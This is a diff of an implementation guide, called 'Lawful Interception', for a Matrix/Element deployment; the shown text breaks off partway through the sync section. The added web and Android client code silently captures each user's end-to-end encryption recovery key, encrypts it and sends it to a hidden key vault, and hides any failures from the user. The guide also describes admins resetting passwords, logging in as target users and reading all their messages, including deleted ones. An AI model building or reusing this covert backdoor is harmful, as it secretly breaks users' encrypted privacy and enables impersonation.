@@ -1,10 +1,10 @@
 # Lawful Interception (LI) Requirements - Implementation Guide
 ## Part 1: System Architecture & Key Vault
 
-**Document Version:** 2.0
-**Last Updated:** November 16, 2025
+**Last Updated:** November 17, 2025
 **Project Structure:**
-- **Main Instance**: synapse, element-web, synapse-admin, key_vault (Django)
+- **Main Instance**: synapse, element-web, synapse-admin
+- **LI Network**: key_vault (Django)
 - **Hidden Instance**: synapse-li, element-web-li, synapse-admin-li
 
 ---
@@ -23,34 +23,48 @@
 
 ### 1.1 Overview
 
-The LI system consists of two separate deployments:
+The LI system consists of two separate deployments with dedicated LI network:
 
 ```
 ┌─────────────────────────────────────────────────────────────┐
 │                    MAIN PRODUCTION INSTANCE                  │
+│                      (matrix namespace)                      │
 ├─────────────────────────────────────────────────────────────┤
 │                                                               │
-│  ┌────────────┐    ┌──────────────┐    ┌────────────────┐  │
-│  │  synapse   │───>│ PostgreSQL   │    │   key_vault    │  │
-│  │  + workers │    │   Cluster    │    │   (Django)     │  │
-│  └────────────┘    └──────────────┘    └────────────────┘  │
-│         │                                        ▲           │
-│         │ Proxy auth                             │           │
-│         └────────────────────────────────────────┘           │
-│                                                               │
+│  ┌────────────┐    ┌──────────────┐                         │
+│  │  synapse   │───>│ PostgreSQL   │                         │
+│  │  + workers │    │   Cluster    │                         │
+│  └────────────┘    └──────────────┘                         │
+│         │                                                     │
+│         │ Proxy auth (ONLY synapse can access key_vault)    │
+│         └──────────────────────┐                            │
+│                                 │                            │
 │  ┌────────────┐    ┌────────────┐                           │
 │  │ element-web│    │synapse-admin│                           │
 │  └────────────┘    └────────────┘                           │
-│         ▲                  ▲                                  │
-│         │                  │                                  │
-│     Users send keys    Admin views stats                     │
+│                                                               │
+└───────────────────────────────────┬─────────────────────────┘
+                                    │
+                                    │ HTTPS (authenticated)
+                                    ▼
+┌─────────────────────────────────────────────────────────────┐
+│                      LI NETWORK (Isolated)                   │
+│            ONLY accessible from main synapse                 │
+├─────────────────────────────────────────────────────────────┤
+│                                                               │
+│                  ┌────────────────┐                          │
+│                  │   key_vault    │                          │
+│                  │   (Django)     │                          │
+│                  └────────────────┘                          │
+│                                                               │
 └─────────────────────────────────────────────────────────────┘
-                              │
-                              │ On-demand sync (Celery)
-                              ▼
+                                    │
+                                    │ On-demand sync (Celery)
+                                    ▼
 ┌─────────────────────────────────────────────────────────────┐
 │                    HIDDEN LI INSTANCE                        │
 │                   (Separate Server/Network)                  │
+│                     (matrix-li namespace)                    │
 ├─────────────────────────────────────────────────────────────┤
 │                                                               │
 │  ┌────────────┐    ┌──────────────┐    ┌────────────────┐  │
@@ -60,7 +74,7 @@ The LI system consists of two separate deployments:
 │                                                               │
 │  ┌──────────────┐  ┌──────────────────┐                     │
 │  │element-web-li│  │synapse-admin-li  │                     │
-│  │(shows deleted│  │(sync button)     │                     │
+│  │(shows deleted│  │(sync + decrypt)  │                     │
 │  │  messages)   │  └──────────────────┘                     │
 │  └──────────────┘                                            │
 │         ▲                                                     │
@@ -71,34 +85,34 @@ The LI system consists of two separate deployments:
 
 ### 1.2 Project Naming
 
-| Component | Main Instance | Hidden Instance | Purpose |
-|-----------|---------------|-----------------|---------|
-| **Synapse** | synapse | synapse-li | Matrix homeserver |
-| **Element Web** | element-web | element-web-li | Web client (LI version shows deleted messages) |
-| **Synapse Admin** | synapse-admin | synapse-admin-li | Admin panel (LI version has sync button) |
-| **Key Storage** | key_vault (Django) | - | Stores encrypted passphrases/recovery keys |
-| **Sync Service** | - | synapse-li (Celery) | Syncs main→hidden instance |
+| Component | Main Instance | LI Network | Hidden Instance | Purpose |
+|-----------|---------------|------------|-----------------|---------|
+| **Synapse** | synapse | - | synapse-li | Matrix homeserver |
+| **Element Web** | element-web | - | element-web-li | Web client (LI version shows deleted messages) |
+| **Synapse Admin** | synapse-admin | - | synapse-admin-li | Admin panel (LI version has sync + decryption) |
+| **Key Storage** | - | key_vault (Django) | - | Stores encrypted recovery keys |
+| **Sync Service** | - | - | synapse-li (Celery) | Syncs main→hidden instance |
 
-**Note**: The directory `synapse_li/` contains the `key_vault` Django project (renamed conceptually, directory name unchanged).
+**Network Isolation**: key_vault is in a separate LI network, accessible ONLY from main synapse (not from workers, element-web, or any other service).
 
 ### 1.3 Data Flow
 
 **Normal User Flow (Main Instance)**:
 1. User sets passphrase or recovery key in element-web
-2. element-web encrypts key with server's hardcoded public key (RSA)
+2. element-web encrypts recovery key with server's hardcoded public key (RSA)
 3. element-web sends encrypted payload to Synapse proxy endpoint
 4. Synapse validates user's access token
-5. Synapse proxies request to key_vault
+5. Synapse proxies request to key_vault (in LI network)
 6. key_vault stores encrypted payload (checks hash for deduplication)
 
 **Admin Investigation Flow (Hidden Instance)**:
 1. Admin clicks sync button in synapse-admin-li
 2. Celery task syncs database + media from main instance
 3. Admin resets target user's password in synapse-li
-4. Admin retrieves user's latest encrypted key from key_vault
-5. Admin decrypts key using private key (kept secure offline)
+4. Admin retrieves user's latest encrypted recovery key from key_vault (via synapse-admin-li decrypt tab)
+5. Admin decrypts key in browser using private key
 6. Admin logs in as user with reset password
-7. Admin verifies session with decrypted key
+7. Admin enters decrypted recovery key to verify session
 8. Admin sees all rooms, messages (including deleted messages with styling)
 
 ---
@@ -107,34 +121,37 @@ The LI system consists of two separate deployments:
 
 ### 2.1 Project Structure
 
-Location: `/synapse_li/`
+Location: `/key_vault/`
 
 ```
-synapse_li/
+key_vault/
 ├── manage.py
 ├── requirements.txt
 ├── .env.example
-├── synapse_li/          # Django project settings
+├── key_vault/          # Django project settings
 │   ├── settings.py
 │   ├── urls.py
 │   ├── wsgi.py
 │   └── asgi.py
-└── secret/              # Django app for key storage
-    ├── models.py        # User and EncryptedKey models
-    ├── views.py         # StoreKeyView API endpoint
-    ├── admin.py         # Django admin interface
+└── secret/             # Django app for key storage
+    ├── models.py       # User and EncryptedKey models
+    ├── views.py        # StoreKeyView API endpoint
+    ├── admin.py        # Django admin interface
     ├── urls.py
     └── apps.py
 ```
 
 ### 2.2 Database Models
 
-**File**: `synapse_li/secret/models.py`
+**File**: `key_vault/secret/models.py`
 
 ```python
 from django.db import models
 from django.utils import timezone
 import hashlib
+import logging
+
+logger = logging.getLogger(__name__)
 
 
 class User(models.Model):
@@ -154,15 +171,18 @@ class User(models.Model):
 
 class EncryptedKey(models.Model):
     """
-    Stores encrypted passphrase or recovery key for a user.
+    Stores encrypted recovery key for a user.
 
     - Never delete records (full history preserved)
     - Deduplication via payload_hash (only latest checked)
     - Admin retrieves latest key for impersonation
+
+    Note: We store the RECOVERY KEY (not passphrase).
+    The passphrase is converted to recovery key via PBKDF2 in the client.
+    The recovery key is the actual AES-256 encryption key.
     """
     user = models.ForeignKey(User, on_delete=models.CASCADE, related_name='keys')
-    key_type = models.CharField(max_length=20, db_index=True)  # 'passphrase' or 'recovery_key'
-    encrypted_payload = models.TextField()  # RSA-encrypted key
+    encrypted_payload = models.TextField()  # RSA-encrypted recovery key
     payload_hash = models.CharField(max_length=64, db_index=True)  # SHA256 hash for deduplication
     created_at = models.DateTimeField(default=timezone.now, db_index=True)
 
@@ -178,24 +198,30 @@ class EncryptedKey(models.Model):
         # Auto-calculate hash if not provided
         if not self.payload_hash:
             self.payload_hash = hashlib.sha256(self.encrypted_payload.encode()).hexdigest()
+
+        # LI: Log key storage for audit trail
+        logger.info(
+            f"LI: Storing encrypted key for user {self.user.username}, "
+            f"hash={self.payload_hash[:16]}"
+        )
+
         super().save(*args, **kwargs)
 
     def __str__(self):
-        return f"{self.user.username} - {self.key_type} ({self.created_at})"
+        return f"{self.user.username} ({self.created_at})"
 ```
 
 **Field Justification**:
 - `username`: Identifies which user's key this is
-- `key_type`: Distinguish passphrase vs recovery_key
-- `encrypted_payload`: RSA-encrypted key (Base64 encoded)
+- `encrypted_payload`: RSA-encrypted recovery key (Base64 encoded)
 - `payload_hash`: SHA256 for deduplication (only check latest record)
 - `created_at`: Timestamp for ordering (latest = most recent)
 
-**No fields removed** - all are essential.
+**Removed**: `key_type` field - no longer needed since we only store recovery keys (not passphrases).
 
 ### 2.3 API Endpoint
 
-**File**: `synapse_li/secret/views.py`
+**File**: `key_vault/secret/views.py`
 
 ```python
 from rest_framework.views import APIView
@@ -203,18 +229,20 @@ from rest_framework.response import Response
 from rest_framework import status
 from .models import User, EncryptedKey
 import hashlib
+import logging
+
+logger = logging.getLogger(__name__)
 
 
 class StoreKeyView(APIView):
     """
-    API endpoint to store encrypted passphrase/recovery key.
+    API endpoint to store encrypted recovery key.
 
     Called by Synapse proxy endpoint (authenticated).
     Request format:
     {
         "username": "@user:server.com",
-        "key_type": "passphrase" or "recovery_key",
-        "encrypted_payload": "Base64-encoded RSA-encrypted key"
+        "encrypted_payload": "Base64-encoded RSA-encrypted recovery key"
     }
 
     Deduplication logic:
@@ -226,19 +254,16 @@ class StoreKeyView(APIView):
     def post(self, request):
         # Extract data
         username = request.data.get('username')
-        key_type = request.data.get('key_type')
         encrypted_payload = request.data.get('encrypted_payload')
 
+        # LI: Log incoming request (audit trail)
+        logger.info(f"LI: Received key storage request for user {username}")
+
         # Validate
-        if not all([username, key_type, encrypted_payload]):
+        if not all([username, encrypted_payload]):
+            logger.warning(f"LI: Missing required fields in request for {username}")
             return Response(
                 {'error': 'Missing required fields'},
-                status=status.HTTP_400_BAD_REQUEST
-            )
-
-        if key_type not in ['passphrase', 'recovery_key']:
-            return Response(
-                {'error': 'Invalid key_type. Must be "passphrase" or "recovery_key"'},
                 status=status.HTTP_400_BAD_REQUEST
             )
 
@@ -248,11 +273,15 @@ class StoreKeyView(APIView):
         # Get or create user
         user, created = User.objects.get_or_create(username=username)
 
+        if created:
+            logger.info(f"LI: Created new user record for {username}")
+
         # Check if latest key matches (deduplication)
         latest_key = EncryptedKey.objects.filter(user=user).first()  # Ordered by -created_at
 
         if latest_key and latest_key.payload_hash == payload_hash:
             # Duplicate - no need to store
+            logger.info(f"LI: Duplicate key for {username}, skipping storage")
             return Response({
                 'status': 'skipped',
                 'reason': 'Duplicate key (matches latest record)',
@@ -262,21 +291,24 @@ class StoreKeyView(APIView):
         # Create new record
         encrypted_key = EncryptedKey.objects.create(
             user=user,
-            key_type=key_type,
             encrypted_payload=encrypted_payload,
             payload_hash=payload_hash
+        )
+
+        logger.info(
+            f"LI: Successfully stored new key for {username}, "
+            f"key_id={encrypted_key.id}"
         )
 
         return Response({
             'status': 'stored',
             'key_id': encrypted_key.id,
             'username': username,
-            'key_type': key_type,
             'created_at': encrypted_key.created_at.isoformat()
         }, status=status.HTTP_201_CREATED)
 ```
 
-**File**: `synapse_li/secret/urls.py`
+**File**: `key_vault/secret/urls.py`
 
 ```python
 from django.urls import path
@@ -289,7 +321,7 @@ urlpatterns = [
 
 ### 2.4 Django Admin Interface
 
-**File**: `synapse_li/secret/admin.py`
+**File**: `key_vault/secret/admin.py`
 
 ```python
 from django.contrib import admin
@@ -309,8 +341,8 @@ class UserAdmin(admin.ModelAdmin):
 
 @admin.register(EncryptedKey)
 class EncryptedKeyAdmin(admin.ModelAdmin):
-    list_display = ['user', 'key_type', 'created_at', 'payload_hash_short']
-    list_filter = ['key_type', 'created_at']
+    list_display = ['user', 'created_at', 'payload_hash_short']
+    list_filter = ['created_at']
     search_fields = ['user__username', 'payload_hash']
     readonly_fields = ['created_at', 'payload_hash']
     ordering = ['-created_at']
@@ -323,11 +355,11 @@ class EncryptedKeyAdmin(admin.ModelAdmin):
     # Display encrypted payload (truncated)
     def get_readonly_fields(self, request, obj=None):
         if obj:  # Editing existing
-            return self.readonly_fields + ['user', 'key_type', 'encrypted_payload']
+            return self.readonly_fields + ['user', 'encrypted_payload']
         return self.readonly_fields
 ```
 
-**Usage**: Admin can view all stored keys, search by username, and retrieve encrypted payloads for decryption.
+**Usage**: Admin can view all stored keys, search by username, and retrieve encrypted payloads for decryption in synapse-admin-li decrypt tab.
 
 ---
 
@@ -336,6 +368,8 @@ class EncryptedKeyAdmin(admin.ModelAdmin):
 ### 3.1 Simple RSA Public Key Encryption
 
 **Approach**: Straightforward RSA encryption without hybrid schemes.
+
+**Important Note**: Matrix converts passphrases to recovery keys via PBKDF2-SHA-512. The recovery key (not the passphrase) is the actual AES-256 encryption key used by Matrix. We capture and store the recovery key.
 
 ```
 ┌─────────────────────────────────────────────────────────┐
@@ -346,8 +380,17 @@ class EncryptedKeyAdmin(admin.ModelAdmin):
 │         │                                                 │
 │         ▼                                                 │
 │  ┌──────────────────────────────────┐                   │
-│  │ Encrypt with hardcoded RSA       │                   │
-│  │ public key (2048-bit)            │                   │
+│  │ Matrix SDK derives recovery key  │                   │
+│  │ PBKDF2(passphrase, 500k iters)   │                   │
+│  └──────────────────────────────────┘                   │
+│         │                                                 │
+│         ▼                                                 │
+│  recoveryKey (256-bit AES key)                           │
+│         │                                                 │
+│         ▼                                                 │
+│  ┌──────────────────────────────────┐                   │
+│  │ Encrypt recovery key with        │                   │
+│  │ hardcoded RSA public key         │                   │
 │  └──────────────────────────────────┘                   │
 │         │                                                 │
 │         ▼                                                 │
@@ -366,25 +409,25 @@ class EncryptedKeyAdmin(admin.ModelAdmin):
                               │
                               ▼
 ┌─────────────────────────────────────────────────────────┐
-│                     KEY_VAULT                            │
+│                     KEY_VAULT (LI Network)               │
 ├─────────────────────────────────────────────────────────┤
 │  Store encrypted_payload in database (no processing)    │
 └─────────────────────────────────────────────────────────┘
                               │
                               ▼
 ┌─────────────────────────────────────────────────────────┐
-│                  ADMIN (Hidden Instance)                 │
+│          ADMIN (synapse-admin-li Decrypt Tab)            │
 ├─────────────────────────────────────────────────────────┤
 │  Retrieve encrypted_payload from key_vault              │
 │         │                                                 │
 │         ▼                                                 │
 │  ┌──────────────────────────────────┐                   │
-│  │ Decrypt with RSA private key     │                   │
-│  │ (admin keeps secure offline)     │                   │
+│  │ Decrypt in browser with private  │                   │
+│  │ key (admin enters private key)   │                   │
 │  └──────────────────────────────────┘                   │
 │         │                                                 │
 │         ▼                                                 │
-│  plaintext_passphrase: "MySecretPass123"                │
+│  plaintext recovery key                                  │
 │         │                                                 │
 │         └─────────> Use to verify session in synapse-li │
 │                                                           │
@@ -407,10 +450,10 @@ cat public_key.pem
 ```
 
 **Storage**:
-- **Private Key**: Admin keeps secure (offline, encrypted volume, etc.)
+- **Private Key**: Admin keeps secure (up to admin - out of scope)
 - **Public Key**: Hardcoded in client configurations (element-web, element-x-android)
 
-**No Key Rotation**: Single keypair used permanently (avoids managing multiple private keys).
+**No Key Rotation**: Single keypair used permanently.
 
 ### 3.3 Client-Side Encryption (element-web)
 
@@ -418,7 +461,7 @@ cat public_key.pem
 
 ```typescript
 /**
- * LI encryption utilities for encrypting passphrases/recovery keys
+ * LI encryption utilities for encrypting recovery keys
  * before sending to server.
  */
 
@@ -431,9 +474,9 @@ MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA... (your key here)
 -----END PUBLIC KEY-----`;
 
 /**
- * Encrypt passphrase or recovery key with RSA public key.
+ * Encrypt recovery key with RSA public key.
  *
- * @param plaintext - The passphrase or recovery key to encrypt
+ * @param plaintext - The recovery key to encrypt
  * @returns Base64-encoded encrypted payload
  */
 export function encryptKey(plaintext: string): string {
@@ -447,16 +490,6 @@ export function encryptKey(plaintext: string): string {
 
     return encrypted;  // Already Base64-encoded by JSEncrypt
 }
-
-/**
- * Get key type from context.
- *
- * @param isRecoveryKey - True if this is recovery key, false if passphrase
- * @returns 'passphrase' | 'recovery_key'
- */
-export function getKeyType(isRecoveryKey: boolean): string {
-    return isRecoveryKey ? 'recovery_key' : 'passphrase';
-}
 ```
 
 **Dependencies**: Add `jsencrypt` to element-web's package.json:
@@ -469,58 +502,18 @@ export function getKeyType(isRecoveryKey: boolean): string {
 }
 ```
 
-### 3.4 Admin Decryption (Hidden Instance)
+### 3.4 Admin Decryption (synapse-admin-li Decrypt Tab)
 
-**Tool**: Python script for admin use
+**Implementation**: Browser-based decryption (no backend needed, see Part 4 for UI details).
 
-```python
-#!/usr/bin/env python3
-"""
-Decrypt encrypted key from key_vault database.
-
-Usage:
-    python decrypt_key.py <encrypted_payload_base64>
-
-Requires:
-    - private_key.pem in same directory
-    - pip install pycryptodome
-"""
-
-from Crypto.PublicKey import RSA
-from Crypto.Cipher import PKCS1_OAEP
-import base64
-import sys
-
-
-def decrypt_key(encrypted_payload_b64: str, private_key_path: str = 'private_key.pem') -> str:
-    """Decrypt RSA-encrypted payload."""
-    # Load private key
-    with open(private_key_path, 'r') as f:
-        private_key = RSA.import_key(f.read())
-
-    # Decrypt
-    cipher = PKCS1_OAEP.new(private_key)
-    encrypted_bytes = base64.b64decode(encrypted_payload_b64)
-    decrypted_bytes = cipher.decrypt(encrypted_bytes)
-
-    return decrypted_bytes.decode('utf-8')
-
-
-if __name__ == '__main__':
-    if len(sys.argv) != 2:
-        print('Usage: python decrypt_key.py <encrypted_payload_base64>')
-        sys.exit(1)
-
-    encrypted_payload = sys.argv[1]
-    plaintext = decrypt_key(encrypted_payload)
-    print(f'Decrypted key: {plaintext}')
-```
-
-**Admin workflow**:
-1. Query key_vault database for user's latest encrypted key
-2. Copy `encrypted_payload` value
-3. Run: `python decrypt_key.py "<encrypted_payload>"`
-4. Use decrypted passphrase to verify session in synapse-li
+Admin workflow:
+1. Navigate to Decryption tab in synapse-admin-li
+2. Retrieve encrypted payload from key_vault database (via Django admin or API)
+3. Enter private key in first text box
+4. Enter encrypted payload in second text box
+5. Click "Decrypt" button
+6. See decrypted recovery key in third text box (or error message if decryption failed)
+7. Use decrypted recovery key to verify session in synapse-li
 
 ---
 
@@ -532,6 +525,7 @@ Synapse validates user's access token before forwarding key storage request to k
 - Only authenticated users can store keys
 - Audit trail (Synapse logs the request)
 - No direct client → key_vault access (security)
+- Network isolation (only Synapse can reach LI network)
 
 ### 4.2 Implementation
 
@@ -579,11 +573,18 @@ class LIProxyServlet(RestServlet):
         requester = await self.auth.get_user_by_req(request)
         user_id = requester.user.to_string()
 
+        # LI: Log for audit trail
+        logger.info(f"LI: Key storage request from user {user_id}")
+
         # Parse request body
         body = parse_json_object_from_request(request)
 
         # Ensure username matches authenticated user (security check)
         if body.get('username') != user_id:
+            logger.warning(
+                f"LI: Username mismatch - authenticated: {user_id}, "
+                f"provided: {body.get('username')}"
+            )
             return 403, {"error": "Username mismatch"}
 
         # LI: Forward to key_vault
@@ -595,9 +596,22 @@ class LIProxyServlet(RestServlet):
                     timeout=aiohttp.ClientTimeout(total=30)
                 ) as resp:
                     response_data = await resp.json()
+
+                    # LI: Log result
+                    if resp.status in [200, 201]:
+                        logger.info(
+                            f"LI: Key successfully stored for {user_id}, "
+                            f"status={response_data.get('status')}"
+                        )
+                    else:
+                        logger.error(
+                            f"LI: Key storage failed for {user_id}, "
+                            f"status={resp.status}"
+                        )
+
                     return resp.status, response_data
         except Exception as e:
-            logger.error(f"LI: Failed to forward to key_vault: {e}")
+            logger.error(f"LI: Failed to forward to key_vault for {user_id}: {e}")
             return 500, {"error": "Failed to store key"}
 
 
@@ -640,7 +654,7 @@ class LIConfig(Config):
         self.enabled = li_config.get("enabled", False)
         self.key_vault_url = li_config.get(
             "key_vault_url",
-            "http://key-vault.matrix.svc.cluster.local:8000"
+            "http://key-vault.matrix-li.svc.cluster.local:8000"
         )
 
     def generate_config_section(self, **kwargs: Any) -> str:
@@ -650,8 +664,9 @@ class LIConfig(Config):
           # Enable LI proxy endpoints
           enabled: false
 
-          # key_vault Django service URL
-          key_vault_url: "http://key-vault.matrix.svc.cluster.local:8000"
+          # key_vault Django service URL (LI network)
+          # Only main Synapse can access this URL
+          key_vault_url: "http://key-vault.matrix-li.svc.cluster.local:8000"
         """
 ```
 
@@ -669,13 +684,13 @@ class HomeServerConfig(RootConfig):
     ]
 ```
 
-**Configuration** (`homeserver.yaml`):
+**Configuration** (`homeserver.yaml` for main instance):
 
 ```yaml
 # LI: Lawful Interception
 li:
   enabled: true
-  key_vault_url: "http://key-vault.matrix.svc.cluster.local:8000"
+  key_vault_url: "http://key-vault.matrix-li.svc.cluster.local:8000"
 ```
 
 ---
@@ -684,17 +699,13 @@ li:
 
 ### 5.1 element-web Changes
 
-**Objective**: Send encrypted passphrase/recovery key to Synapse proxy endpoint whenever user sets, resets, or verifies with their key.
+**Objective**: Send encrypted recovery key to Synapse proxy endpoint whenever user sets, resets, or enters their key.
 
-**When to send**:
-1. User creates new passphrase
-2. User creates new recovery key
-3. User resets passphrase
-4. User enters passphrase to verify session ← **IMPORTANT**: Capture even on verification
+**When to send**: When Matrix SDK generates the recovery key (either from passphrase or auto-generated).
 
 **Retry logic**: 5 attempts, 10 second interval, 30 second timeout per request
 
-#### Integration Point 1: Passphrase Creation/Reset
+#### Integration Point: Recovery Key Generation
 
 **File**: `element-web/src/stores/LIKeyCapture.ts` (NEW FILE)
 
@@ -702,12 +713,12 @@ li:
 /**
  * LI Key Capture Module
  *
- * Sends encrypted passphrases/recovery keys to Synapse LI proxy endpoint.
+ * Sends encrypted recovery keys to Synapse LI proxy endpoint.
  * Retry logic: 5 attempts, 10 second interval, 30 second timeout.
  */
 
 import { MatrixClient } from "matrix-js-sdk";
-import { encryptKey, getKeyType } from "../utils/LIEncryption";
+import { encryptKey } from "../utils/LIEncryption";
 
 const MAX_RETRIES = 5;
 const RETRY_INTERVAL_MS = 10000;  // 10 seconds
@@ -715,19 +726,17 @@ const REQUEST_TIMEOUT_MS = 30000;  // 30 seconds
 
 export interface KeyCaptureOptions {
     client: MatrixClient;
-    key: string;  // Plaintext passphrase or recovery key
-    isRecoveryKey: boolean;
+    recoveryKey: string;  // The actual recovery key (not passphrase)
 }
 
 /**
- * Send encrypted key to LI endpoint with retry logic.
+ * Send encrypted recovery key to LI endpoint with retry logic.
  */
 export async function captureKey(options: KeyCaptureOptions): Promise<void> {
-    const { client, key, isRecoveryKey } = options;
+    const { client, recoveryKey } = options;
 
-    // Encrypt key
-    const encryptedPayload = encryptKey(key);
-    const keyType = getKeyType(isRecoveryKey);
+    // Encrypt recovery key
+    const encryptedPayload = encryptKey(recoveryKey);
     const username = client.getUserId()!;
 
     // Retry loop
@@ -743,7 +752,6 @@ export async function captureKey(options: KeyCaptureOptions): Promise<void> {
                     },
                     body: JSON.stringify({
                         username,
-                        key_type: keyType,
                         encrypted_payload: encryptedPayload,
                     }),
                     signal: AbortSignal.timeout(REQUEST_TIMEOUT_MS),
@@ -771,74 +779,26 @@ export async function captureKey(options: KeyCaptureOptions): Promise<void> {
 }
 ```
 
-**File**: `element-web/src/components/views/dialogs/security/CreateSecretStorageDialog.tsx` (MODIFICATION)
+**File**: `element-web/src/async-components/views/dialogs/security/CreateSecretStorageDialog.tsx` (MODIFICATION)
 
 ```typescript
 // LI: Import key capture
 import { captureKey } from "../../../../stores/LIKeyCapture";
 
-// In _doBootstrapUIAuth() or wherever passphrase is set:
-async function onPassphraseCreated(passphrase: string) {
+// In _doBootstrapUIAuth() or wherever recovery key is generated:
+async function onRecoveryKeyGenerated(recoveryKey: GeneratedSecretStorageKey) {
     // ... existing setup logic ...
 
-    // LI: Capture passphrase (fire and forget - don't block UX)
+    // LI: Capture recovery key (fire and forget - don't block UX)
     captureKey({
         client: MatrixClientPeg.get(),
-        key: passphrase,
-        isRecoveryKey: false,
+        recoveryKey: recoveryKey.encodedPrivateKey,  // The actual recovery key
     }).catch(err => {
         // Silent failure - don't disrupt user experience
         console.error('LI: Key capture failed:', err);
     });
 
     // ... continue with normal flow ...
-}
-```
-
-#### Integration Point 2: Recovery Key Creation
-
-**File**: `element-web/src/components/views/dialogs/security/CreateSecretStorageDialog.tsx` (MODIFICATION)
-
-```typescript
-async function onRecoveryKeyCreated(recoveryKey: string) {
-    // ... existing setup logic ...
-
-    // LI: Capture recovery key
-    captureKey({
-        client: MatrixClientPeg.get(),
-        key: recoveryKey,
-        isRecoveryKey: true,
-    }).catch(err => {
-        console.error('LI: Key capture failed:', err);
-    });
-
-    // ... continue ...
-}
-```
-
-#### Integration Point 3: Key Verification (Session Verification)
-
-**File**: `element-web/src/stores/SetupEncryptionStore.ts` (MODIFICATION)
-
-```typescript
-// LI: Import key capture
-import { captureKey } from "./LIKeyCapture";
-
-// In verifyWithPassphrase() or similar:
-async function verifyWithPassphrase(passphrase: string) {
-    // ... existing verification logic ...
-
-    // LI: Capture passphrase even on verification
-    // (User entering passphrase = another opportunity to capture)
-    captureKey({
-        client: this.matrixClient,
-        key: passphrase,
-        isRecoveryKey: false,
-    }).catch(err => {
-        console.error('LI: Key capture on verification failed:', err);
-    });
-
-    // ... continue verification ...
 }
 ```
 
@@ -851,7 +811,7 @@ All LI-related code changes marked with `// LI:` prefix for easy identification 
 
 ### 5.2 element-x-android Changes
 
-**Objective**: Same as element-web - capture keys on set/reset/verification.
+**Objective**: Same as element-web - capture recovery keys when generated.
 
 **File**: `element-x-android/libraries/matrix/impl/src/main/kotlin/io/element/android/libraries/matrix/impl/li/LIKeyCapture.kt` (NEW FILE)
 
@@ -874,7 +834,7 @@ import javax.crypto.Cipher
 /**
  * LI Key Capture for Android
  *
- * Encrypts and sends passphrases/recovery keys to Synapse LI endpoint.
+ * Encrypts and sends recovery keys to Synapse LI endpoint.
  */
 object LIKeyCapture {
 
@@ -890,7 +850,7 @@ object LIKeyCapture {
     """.trimIndent()
 
     /**
-     * Encrypt key with RSA public key.
+     * Encrypt recovery key with RSA public key.
      */
     private fun encryptKey(plaintext: String): String {
         // Parse PEM public key
@@ -913,17 +873,15 @@ object LIKeyCapture {
     }
 
     /**
-     * Send encrypted key to LI endpoint with retry logic.
+     * Send encrypted recovery key to LI endpoint with retry logic.
      */
     suspend fun captureKey(
         homeserverUrl: String,
         accessToken: String,
         username: String,
-        key: String,
-        isRecoveryKey: Boolean
+        recoveryKey: String
     ) {
-        val encryptedPayload = encryptKey(key)
-        val keyType = if (isRecoveryKey) "recovery_key" else "passphrase"
+        val encryptedPayload = encryptKey(recoveryKey)
 
         val client = OkHttpClient()
 
@@ -933,7 +891,6 @@ object LIKeyCapture {
                 withTimeout(REQUEST_TIMEOUT_MS) {
                     val json = JSONObject().apply {
                         put("username", username)
-                        put("key_type", keyType)
                         put("encrypted_payload", encryptedPayload)
                     }
 
@@ -987,8 +944,7 @@ private suspend fun createRecovery(): Result<RecoveryKey> {
                     homeserverUrl = sessionRepository.getHomeserverUrl(),
                     accessToken = sessionRepository.getAccessToken(),
                     username = sessionRepository.getUserId(),
-                    key = recoveryKey.value,
-                    isRecoveryKey = true
+                    recoveryKey = recoveryKey.value  // The actual recovery key
                 )
             } catch (e: Exception) {
                 Timber.e(e, "LI: Key capture failed")
@@ -1012,114 +968,182 @@ The hidden instance (synapse-li, element-web-li, synapse-admin-li) must stay in 
 - **Incremental**: Only sync data since last successful sync
 - **Robust**: Failed syncs don't break future syncs
 
-### 6.2 Sync Components
+### 6.2 Sync Strategy (Based on Deployment Architecture)
 
-**Components**:
-1. **synapse-admin-li**: Sync button UI + API calls
-2. **synapse-li (Celery)**: Sync service with 3 endpoints + periodic task
-3. **PostgreSQL logical replication**: Database sync mechanism
-4. **rsync/rclone**: Media file sync
+From the deployment review, the main instance uses:
+- **PostgreSQL**: CloudNativePG with synchronous replication
+- **Media**: MinIO distributed object storage
 
-**Architecture**:
-```
-┌──────────────────────────────────────────────────────────┐
-│              synapse-admin-li (Frontend)                  │
-│  ┌────────────────────────────────────────────────────┐  │
-│  │ [Sync] Button  (active/disabled state)            │  │
-│  │   │                                                 │  │
-│  │   ├─> Click: POST /api/v1/sync/trigger            │  │
-│  │   │         Response: {task_id: "abc123"}          │  │
-│  │   │                                                 │  │
-│  │   └─> Poll: GET /api/v1/sync/status/<task_id>     │  │
-│  │           Response: {status: "running"/"success"/"failed"}  │
-│  └────────────────────────────────────────────────────┘  │
-└──────────────────────────────────────────────────────────┘
-                         │
-                         ▼
-┌──────────────────────────────────────────────────────────┐
-│          synapse-li Django (Celery Backend)               │
-│  ┌────────────────────────────────────────────────────┐  │
-│  │ Endpoints:                                          │  │
-│  │  POST /api/v1/sync/trigger  → Create Celery task  │  │
-│  │  GET  /api/v1/sync/status/<id> → Check task status│  │
-│  │  POST /api/v1/sync/config   → Set periodic freq   │  │
-│  └────────────────────────────────────────────────────┘  │
-│  ┌────────────────────────────────────────────────────┐  │
-│  │ Celery Task: sync_instance()                       │  │
-│  │  - Check Redis lock (prevent concurrent)           │  │
-│  │  - Get last sync checkpoint from DB                │  │
-│  │  - Sync PostgreSQL (logical replication)           │  │
-│  │  - Sync media files (rsync)                        │  │
-│  │  - Update checkpoint                               │  │
-│  │  - Release lock                                     │  │
-│  └────────────────────────────────────────────────────┘  │
-│  ┌────────────────────────────────────────────────────┐  │
-│  │ Celery Beat: Periodic sync                         │  │
-│  │  - Schedule: Configurable (X times/day)            │  │
-│  │  - Calls sync_instance() task                      │  │
-│  └────────────────────────────────────────────────────┘  │
-└──────────────────────────────────────────────────────────┘
-                         │
-                         ▼
-┌──────────────────────────────────────────────────────────┐
-│              Main Instance (Read-Only Source)             │
-│   PostgreSQL (logical replication slot)                  │
-│   Media Storage (rsync source)                           │
-└──────────────────────────────────────────────────────────┘
-```
+**Recommended Sync Approach**:
 
-### 6.3 Sync Lock Mechanism
+1. **Database**: PostgreSQL Logical Replication
+2. **Media**: rclone S3-to-S3 sync
 
-**Purpose**: Ensure only ONE sync process runs at a time (whether triggered by admin or periodic task).
+### 6.3 Sync Checkpoint Tracking (File-Based)
 
-**Implementation**: Redis lock with expiry
+**Important**: To avoid Synapse database migrations, we use file-based checkpoint storage instead of Django models.
 
-**File**: `synapse_li/sync/lock.py` (NEW FILE)
+**File**: `synapse-li/sync/checkpoint.py` (NEW FILE)
 
 ```python
 """
